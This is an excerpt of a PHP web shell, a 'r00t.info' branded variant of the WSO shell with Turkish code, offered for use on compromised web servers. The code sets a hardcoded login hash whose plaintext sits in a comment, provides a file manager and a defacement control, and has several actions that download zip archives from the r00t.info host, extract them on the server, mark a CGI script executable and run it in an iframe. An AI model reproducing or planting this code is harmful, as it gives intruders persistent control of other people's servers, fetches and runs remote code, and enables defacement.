<?php
$auth_pass      = "27db7898211c8ccbeb4d5a97d198839a";//r00t
$color          = "ff7f00";
...
function printHeader()
{
    if (empty($_POST['charset']))
        $_POST['charset'] = "UTF-8";
    global $color;
    echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=' . $_POST['charset'] . '"><title>r00t.info wso Shell</title><link REL="SHORTCUT ICON" HREF="http://imagizer.imageshack.us/a/img440/4273/6fix.png">
    <style>
        ...
        input, textarea, select    { margin:0;color:#ff8c00;background-color:#555;border:1px solid ' . $color . '; font: 9pt Monospace,"Courier New"; }
    ...
    echo '<table class="info" cellpadding="0" cellspacing="0" width="100%"><tr><td width="160px"><div class="logo"><img src="http://i.hizliresim.com/z4lrbR.png" id="logo" height="75%" width="90%"/></div><hr style="margin: -5px 13px 2px 17px;width:160px;"><div class="eca1"></div><div class="eca2">Hackers</div></td>
...
<div style="margin:5px;background:#444;"><div class="content" style="border-top:5px solid #444;text-align:center;font-weight:bold;">www.r00t.info' . VERSION . ' &copy; Shell</div></div>
</div>
</body></html>';
}
...
function actionFilesMan()
{
    ...
    echo '</select>&nbsp;<input type="submit" value=">>"></td><td colspan="2" align="right" width="1"><input name="def" value="r00t.info shell" disabled="disabled"/>&nbsp;<input type="submit" value="Add Deface Here" disabled="disabled"></td></tr>
    </form></table></div>';
    printFooter();
}
...
{
    printHeader();
    if (!file_exists('yazilimlar/sqlbudd/index.php')) {
        $dizin = 'http://r00t.info/shell-dosyalar/sqlbudd.zip';
        ...
        dosya_indir($dizin, "sqlbudd");
        $zip  = new ZipArchive();
        $file = 'sqlbudd.zip';
        $zip->open($file);
        $cikar = $zip->extractTo('yazilimlar/');
        if (file_exists('sqlbudd.zip')) {
            @unlink('sqlbudd.zip');
        }
        if ($cikar) {
            echo "<iframe src=yazilimlar/sqlbudd/index.php width=100% height=100% frameborder=0></iframe> ";
        } else {
            echo '<div class="alert alert-danger"><strong>Hata!</strong> Dosya indirilirken kritik bir hata oluÅŸtu.</div>';
        }
    } elseif (file_exists('yazilimlar/sqlbudd/index.php')) {
        echo "<iframe src=yazilimlar/sqlbudd/index.php width=100% height=100% frameborder=0></iframe> ";
    }
    printFooter();
}
...
href=https://www.facebook.com/r00t.info&amp;width=260&amp;colorsche
...
height:100px;" allowtransparency="true"></iframe></center>
    <H3><marquee scrollamount="5" scrolldelay="50" width="100%"><p style="color: #DF0101" >www.r00t.info</p></marquee></H3></body>';
}
...
{
    printHeader();
    if (!file_exists('yazilimlar/cgi/rot.cin')) {
        $dizin = 'http://r00t.info/shell-dosyalar/cgi.zip';
        function dosya_indir($link, $name = null)
        {
            $link_info = pathinfo($link);
            $uzanti    = strtolower($link_info['extension']);
        ...
        if ($cikar) {
            chmod('yazilimlar/cgi/rot.cin', 0755);
            echo "<iframe src=yazilimlar/cgi/rot.cin width=100% height=100% frameborder=0></iframe> ";
        } else {
            echo '<div class="alert alert-danger"><strong>Hata!</strong> Dosya indirilirken kritik bir hata oluÅŸtu.</div>';
        }
    } elseif (file_exists('yazilimlar/cgi/rot.cin')) {
        echo "<iframe src=yazilimlar/cgi/rot.cin width=100% height=100% frameborder=0></iframe> ";
    }
    printFooter();
}
...
function actionSQLBUDDY()
{
    ...
    if (!file_exists('yazilimlar/sqlbuddy/index.php')) {
        $dizin = 'http://r00t.info/shell-dosyalar/sqlbuddy.zip';
        function dosya_indir($link, $name = null)
        {
            $link_info = pathinfo($link);
            $uzanti    = strtolower($link_info['extension']);
